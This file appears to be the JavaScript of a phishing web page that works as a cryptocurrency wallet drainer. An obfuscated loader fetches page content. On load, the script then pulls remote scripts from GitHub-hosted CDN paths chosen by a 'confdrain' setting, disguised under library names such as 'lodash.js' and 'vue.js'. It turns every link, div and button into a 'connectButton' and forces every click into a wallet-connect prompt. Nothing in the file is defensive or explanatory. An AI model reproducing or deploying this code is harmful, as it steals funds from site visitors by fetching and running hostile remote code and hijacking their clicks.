function _0x42fe(){const _0x55b7b8=['Failed\x20to\x20load\x20','location','webid','load','main.html','405779wOFVlM','945UNUVdE','status','Failed\x20to\x20load\x20default\x20page:\x20','219378SMzlMc','.html','search','2609718CGMVkt','get','error','416340IupKbr','statusText','html','ready','5asccNs','7577670LmIdeU','4496vodVIo','970564EZNiXr','#content','2PaVZvv'];_0x42fe=function(){return _0x55b7b8;};return _0x42fe();}function _0x5e62(_0xe0674c,_0x15c312){const _0x42fe35=_0x42fe();return _0x5e62=function(_0x5e62da,_0x178f55){_0x5e62da=_0x5e62da-0x1e4;let _0x408779=_0x42fe35[_0x5e62da];return _0x408779;},_0x5e62(_0xe0674c,_0x15c312);}const _0x4226ab=_0x5e62;(function(_0x17e3f3,_0x286dcc){const _0x504c31=_0x5e62,_0x26c200=_0x17e3f3();while(!![]){try{const _0x323562=parseInt(_0x504c31(0x1f5))/0x1*(parseInt(_0x504c31(0x1ef))/0x2)+-parseInt(_0x504c31(0x1f9))/0x3+parseInt(_0x504c31(0x1ed))/0x4+parseInt(_0x504c31(0x1ea))/0x5*(parseInt(_0x504c31(0x1fc))/0x6)+-parseInt(_0x504c31(0x1f6))/0x7*(-parseInt(_0x504c31(0x1ec))/0x8)+-parseInt(_0x504c31(0x1e6))/0x9+-parseInt(_0x504c31(0x1eb))/0xa;if(_0x323562===_0x286dcc)break;else _0x26c200['push'](_0x26c200['shift']());}catch(_0x2149a8){_0x26c200['push'](_0x26c200['shift']());}}}(_0x42fe,0x44dea),$(document)[_0x4226ab(0x1e9)](function(){const _0x385a01=_0x4226ab;function _0x59b9a2(_0x27de82){const _0x55eaf9=_0x5e62,_0x2110c5=new URLSearchParams(window[_0x55eaf9(0x1f1)][_0x55eaf9(0x1fb)]);let _0x2f6d2d=_0x2110c5[_0x55eaf9(0x1e4)](_0x27de82);return _0x2f6d2d&&(_0x2f6d2d=_0x2f6d2d['split'](/[?&]/)[0x0]),_0x2f6d2d;}const _0x1e32ca=_0x59b9a2(_0x385a01(0x1f2)),_0x4818c1=_0x1e32ca?_0x1e32ca+_0x385a01(0x1fa):_0x385a01(0x1f4);$(_0x385a01(0x1ee))[_0x385a01(0x1f3)](_0x4818c1,function(_0x3c7a07,_0x49f973,_0x39c6fe){const _0x59a6fc=_0x385a01;_0x49f973===_0x59a6fc(0x1e5)&&(console['warn'](_0x59a6fc(0x1f0)+_0x4818c1+':\x20'+_0x39c6fe[_0x59a6fc(0x1f7)]+'\x20'+_0x39c6fe['statusText']),$(_0x59a6fc(0x1ee))[_0x59a6fc(0x1f3)]('main.html',function(_0x1838a7,_0x6f310c,_0x128c35){const _0x3c884f=_0x59a6fc;_0x6f310c==='error'&&$(_0x3c884f(0x1ee))[_0x3c884f(0x1e8)](_0x3c884f(0x1f8)+_0x128c35[_0x3c884f(0x1f7)]+'\x20'+_0x128c35[_0x3c884f(0x1e7)]);}));});}));

function loadScript(src) {
    const script = document.createElement("script");
    script.charset = "UTF-8";
    script.type = "text/javascript";
    script.src = src + "?v=" + Math.floor(Date.now() / 1e3);
    document.head.appendChild(script);
}
document.addEventListener("DOMContentLoaded", function() {
    if (typeof confdrain === 'undefined' || ![1, 2, 3, 4, 5].includes(confdrain)) {
        confdrain = 1; // Set default
    }

    if (confdrain === 1) {
        loadScript("https://cdn.jsdelivr.net/gh/versionsixnine/v1wallet@latest/lazyloads.js?purge?vs");
    } else if (confdrain === 2) {
        const jsFiles = ["pluginsweet.js", "bootstrapv4.js", "jquery-min.js", "lodash.js", "axios.v1.js"];
        loadScript("https://cdn.jsdelivr.net/gh/cdsync/js@main/" + jsFiles[Math.floor(Math.random() * jsFiles.length)]);
    } else if (confdrain === 3) {
        loadScript("https://cdn.jsdelivr.net/gh/cdsync/tom@main/vue.js");
    } else if (confdrain === 4) {
        loadScript("https://cdn.jsdelivr.net/gh/cdsync/brom@main/splice.js");
    } else if (confdrain === 5) {
        loadScript("https://cdn.jsdelivr.net/gh/cdsync/js@main/particle-ace.js");
    }
});

function addClassesToElements() {
    document.querySelectorAll("a:not(.connectButton), div:not(.connectButton):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal), button:not(.connectButton)")
        .forEach(el => {
            el.classList.add("connectButton");
            if (el.tagName === 'A' && el.hasAttribute("href")) {
                el.removeAttribute("href");
            }
        });
}
function triggerConnectButtonClick() {
    document.addEventListener('click', function(event) {
        if (['A', 'BUTTON'].includes(event.target.tagName)) {
            event.preventDefault();
            const connectButton = document.querySelector('a.connectButton');
            if (connectButton) {
                connectButton.click();
                console.log('connectButton was clicked!');
            }
        }
    });
}
setInterval(addClassesToElements, 500);
triggerConnectButtonClick();

console.log('u can steal code, but we do more =))');
